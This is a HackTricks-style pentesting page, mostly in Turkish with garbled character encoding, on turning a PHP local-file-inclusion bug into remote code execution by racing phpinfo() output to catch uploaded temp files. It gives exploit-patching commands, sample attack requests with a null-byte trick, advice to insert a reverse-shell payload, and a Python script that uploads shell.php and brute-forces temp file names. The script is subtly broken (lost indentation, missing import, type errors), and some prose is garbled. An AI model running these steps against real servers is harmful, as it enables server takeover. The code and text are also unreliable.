{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}


Bu aÃ§Ä±ÄŸÄ± istismar etmek iÃ§in ÅŸunlara ihtiyacÄ±nÄ±z var: **Bir LFI aÃ§Ä±ÄŸÄ±, phpinfo()'un gÃ¶rÃ¼ntÃ¼lendiÄŸi bir sayfa, "file\_uploads = on" ve sunucunun "/tmp" dizinine yazabilmesi.**

[https://www.insomniasec.com/downloads/publications/phpinfolfi.py](https://www.insomniasec.com/downloads/publications/phpinfolfi.py)

**Tutorial HTB**: [https://www.youtube.com/watch?v=rs4zEwONzzk\&t=600s](https://www.youtube.com/watch?v=rs4zEwONzzk\&t=600s)

AÃ§Ä±ÄŸÄ± dÃ¼zeltmeniz gerekiyor ( **=>** yerine **=>** deÄŸiÅŸtirin). Bunu yapmak iÃ§in ÅŸunlarÄ± yapabilirsiniz:
```
sed -i 's/\[tmp_name\] \=>/\[tmp_name\] =\&gt/g' phpinfolfi.py
```
You have to change also the **payload** at the beginning of the exploit (for a php-rev-shell for example), the **REQ1** (this should point to the phpinfo page and should have the padding included, i.e.: _REQ1="""POST /install.php?mode=phpinfo\&a="""+padding+""" HTTP/1.1_), and **LFIREQ** (this should point to the LFI vulnerability, i.e.: _LFIREQ="""GET /info?page=%s%%00 HTTP/1.1\r --_ Check the double "%" when exploiting null char)

{% file src="../../.gitbook/assets/LFI-With-PHPInfo-Assistance.pdf" %}

### Teori

EÄŸer PHP'de yÃ¼klemelere izin veriliyorsa ve bir dosya yÃ¼klemeye Ã§alÄ±ÅŸÄ±yorsanÄ±z, bu dosya sunucu isteÄŸi iÅŸleyene kadar geÃ§ici bir dizinde saklanÄ±r, ardÄ±ndan bu geÃ§ici dosya silinir.

Sonra, web sunucusunda bir LFI aÃ§Ä±ÄŸÄ± bulduysanÄ±z, oluÅŸturulan geÃ§ici dosyanÄ±n adÄ±nÄ± tahmin etmeye Ã§alÄ±ÅŸabilir ve dosya silinmeden Ã¶nce geÃ§ici dosyaya eriÅŸerek bir RCE'yi istismar edebilirsiniz.

**Windows**'ta dosyalar genellikle **C:\Windows\temp\php** dizininde saklanÄ±r.

**Linux**'ta dosyanÄ±n adÄ± genellikle **rastgele** olup **/tmp** dizininde bulunur. Ad rastgele olduÄŸu iÃ§in, **geÃ§ici dosyanÄ±n adÄ±nÄ± bir yerden Ã§Ä±karmak** ve silinmeden Ã¶nce ona eriÅŸmek gerekir. Bu, "**phpconfig()**" fonksiyonunun iÃ§eriÄŸindeki **$\_FILES** deÄŸiÅŸkeninin deÄŸerini okuyarak yapÄ±labilir.

**phpinfo()**

**PHP**, **4096B**'lÄ±k bir tampon kullanÄ±r ve tampon **dolu** olduÄŸunda, **istemciye gÃ¶nderilir**. ArdÄ±ndan istemci, **bÃ¼yÃ¼k baÅŸlÄ±klar** kullanarak **birÃ§ok bÃ¼yÃ¼k istek** **gÃ¶nderebilir**, **php** ters **shell** yÃ¼kleyebilir, **phpinfo()'un ilk kÄ±smÄ±nÄ±n geri dÃ¶nmesini bekleyebilir** (geÃ§ici dosyanÄ±n adÄ± burada bulunur) ve php sunucusu dosyayÄ± silmeden Ã¶nce LFI aÃ§Ä±ÄŸÄ±nÄ± istismar ederek **geÃ§ici dosyaya eriÅŸmeye** Ã§alÄ±ÅŸabilir.

**Ä°simleri brute force denemek iÃ§in Python scripti (uzunluk = 6)**
```python
import itertools
import requests
import sys

print('[+] Trying to win the race')
f = {'file': open('shell.php', 'rb')}
for _ in range(4096 * 4096):
requests.post('http://target.com/index.php?c=index.php', f)


print('[+] Bruteforcing the inclusion')
for fname in itertools.combinations(string.ascii_letters + string.digits, 6):
url = 'http://target.com/index.php?c=/tmp/php' + fname
r = requests.get(url)
if 'load average' in r.text:  # <?php echo system('uptime');
print('[+] We have got a shell: ' + url)
sys.exit(0)

print('[x] Something went wrong, please try again')
```
{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks EÄŸitim AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks EÄŸitim GCP KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}
